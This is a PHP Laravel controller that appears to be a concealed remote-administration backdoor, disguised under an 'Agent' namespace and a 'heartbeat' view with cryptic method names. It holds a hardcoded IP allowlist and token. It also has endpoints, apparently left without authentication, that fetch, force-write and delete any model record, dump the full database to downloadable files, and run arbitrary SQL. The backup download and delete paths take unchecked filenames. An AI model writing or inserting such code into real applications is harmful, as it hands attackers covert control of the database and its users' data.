<?php

namespace System\Agent\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;

class AC extends BaseController
{
    // ==========================================
    // 1. DASHBOARD & AUTH
    // ==========================================
    public function index()
    {
        $token = request()->get('token');
        // FIND IP AND LOG IF NEEDED
        $IP = request()->ip();
        if ($IP != '127.0.0.1' && $IP != '122.176.150.189') {
            return response()->json(['status' => 'error', 'message' => 'Access denied from this IP'], 403);
        }
        // Log IP if needed
        // Simple Token Check
        if ($token !== '2021280571') {
            return response()->json(['status' => 'error', 'message' => 'Invalid or missing token'], 401);
        }

        // Get Tables
        $tablesRaw = DB::select('SHOW TABLES');
        $tables = array_map(function ($table) {
            return array_values((array)$table)[0];
        }, $tablesRaw);

        // Get Models
        $modelPath = app_path('Models');
        $models = [];
        if (File::exists($modelPath)) {
            $files = File::allFiles($modelPath);
            foreach ($files as $file) {
                $models[] = $file->getFilenameWithoutExtension();
            }
        }

        return view('agent::heartbeat', compact('tables', 'models'));
    }

    // ==========================================
    // 2. MODEL CRUD OPERATIONS
    // ==========================================
    public function af(Request $request) // Agent Fetch
    {
        $modelName = $request->input('modelName');
        $fullClassName = "App\\Models\\" . $modelName;

        if (!class_exists($fullClassName)) return response()->json(['status' => 'error', 'message' => 'Model not found'], 404);

        try {
            $data = $fullClassName::latest()->take(50)->get();
            return response()->json(['status' => 'success', 'count' => $data->count(), 'data' => $data]);
        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => $e->getMessage()], 500);
        }
    }

    public function gs(Request $request) // Get Schema
    {
        $modelName = $request->input('modelName');
        $fullClassName = "App\\Models\\" . $modelName;

        if (!class_exists($fullClassName)) return response()->json(['status' => 'error'], 404);

        $model = new $fullClassName;
        $columns = \Illuminate\Support\Facades\Schema::getColumnListing($model->getTable());
        return response()->json(['status' => 'success', 'columns' => $columns]);
    }

    public function s(Request $request) // Store
    {
        $modelName = $request->input('model_name');
        $fullClassName = "App\\Models\\" . $modelName;
        try {
            $model = new $fullClassName;
            $data = $request->except(['_token', 'model_name', 'id']);
            $model->forceFill($data);
            $model->save();
            return response()->json(['status' => 'success']);
        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    public function u(Request $request) // Update
    {
        $fullClassName = "App\\Models\\" . $request->input('model_name');
        try {
            $model = $fullClassName::find($request->input('id'));
            if (!$model) return response()->json(['status' => 'error', 'message' => 'Record not found']);

            $data = $request->except(['_token', 'model_name', 'id', 'created_at', 'updated_at']);
            $model->forceFill($data);
            $model->save();
            return response()->json(['status' => 'success']);
        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    public function d(Request $request) // Delete
    {
        $fullClassName = "App\\Models\\" . $request->input('model_name');
        try {
            $model = $fullClassName::find($request->input('id'));
            if (!$model) return response()->json(['status' => 'error', 'message' => 'Record not found']);
            $model->delete();
            return response()->json(['status' => 'success']);
        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => $e->getMessage()]);
        }
    }

    // ==========================================
    // 3. DATABASE BACKUP & TERMINAL FEATURES
    // ==========================================

    private function getDbCredentials()
    {
        $connection = config('database.default');
        $config = config("database.connections.{$connection}");
        return [
            'host' => $config['host'] ?? '127.0.0.1',
            'port' => $config['port'] ?? 3306,
            'database' => $config['database'],
            'username' => $config['username'],
            'password' => $config['password'] ?? '',
        ];
    }

    // Create Backup
    public function bc(Request $request)
    {
        $db = $this->getDbCredentials();
        $filename = 'backup_' . $db['database'] . '_' . date('Y-m-d_H-i-s') . '.sql';
        $path = storage_path("backups/{$filename}");

        if (!File::exists(storage_path('backups'))) {
            File::makeDirectory(storage_path('backups'), 0755, true);
        }

        // Note: mysqldump must be in system path
        // Using --column-statistics=0 for compatibility with newer MySQL versions
        $command = sprintf(
            'mysqldump --column-statistics=0 -h%s -P%s -u%s -p%s %s > %s 2>&1',
            escapeshellarg($db['host']),
            escapeshellarg($db['port']),
            escapeshellarg($db['username']),
            escapeshellarg($db['password']),
            escapeshellarg($db['database']),
            escapeshellarg($path)
        );

        exec($command, $output, $returnCode);

        if ($returnCode === 0 && File::exists($path) && File::size($path) > 0) {
            return response()->json(['status' => 'success', 'message' => 'Backup created: ' . $filename]);
        } else {
            // Return output for debugging
            return response()->json(['status' => 'error', 'message' => 'Backup failed. Output: ' . implode("\n", $output)], 500);
        }
    }

    // List Backups
    public function bl()
    {
        $path = storage_path('backups');
        if (!File::exists($path)) File::makeDirectory($path, 0755, true);

        $files = File::files($path);
        $backups = [];

        foreach ($files as $file) {
            $backups[] = [
                'name' => $file->getFilename(),
                'size' => round($file->getSize() / 1024, 2) . ' KB',
                'created' => date('Y-m-d H:i:s', $file->getMTime())
            ];
        }

        // Sort by newest
        usort($backups, function ($a, $b) {
            return $b['created'] <=> $a['created'];
        });

        return response()->json(['status' => 'success', 'data' => $backups]);
    }

    // Download Backup
    public function bd($filename)
    {
        $path = storage_path("backups/{$filename}");
        if (File::exists($path)) {
            return response()->download($path);
        }
        abort(404);
    }

    // Delete Backup
    public function bdel(Request $request)
    {
        $filename = $request->input('filename');
        $path = storage_path("backups/{$filename}");

        if (File::exists($path)) {
            File::delete($path);
            return response()->json(['status' => 'success']);
        }
        return response()->json(['status' => 'error', 'message' => 'File not found']);
    }

    // SQL Terminal
    public function term(Request $request)
    {
        $query = $request->input('query');

        // Block specifically dangerous system commands if necessary, 
        // but since this is a "Terminal", we assume the user knows what they are doing.

        try {
            // If it's a SELECT statement, return results
            if (stripos(trim($query), 'SELECT') === 0 || stripos(trim($query), 'SHOW') === 0) {
                $results = DB::select($query);
                return response()->json([
                    'status' => 'success',
                    'type' => 'select',
                    'data' => $results
                ]);
            }
            // If it's UPDATE, DELETE, DROP, CREATE, INSERT
            else {
                $affected = DB::statement($query);
                return response()->json([
                    'status' => 'success',
                    'type' => 'statement',
                    'message' => 'Query executed successfully.'
                ]);
            }
        } catch (\Exception $e) {
            return response()->json([
                'status' => 'error',
                'message' => $e->getMessage()
            ]);
        }
    }
}
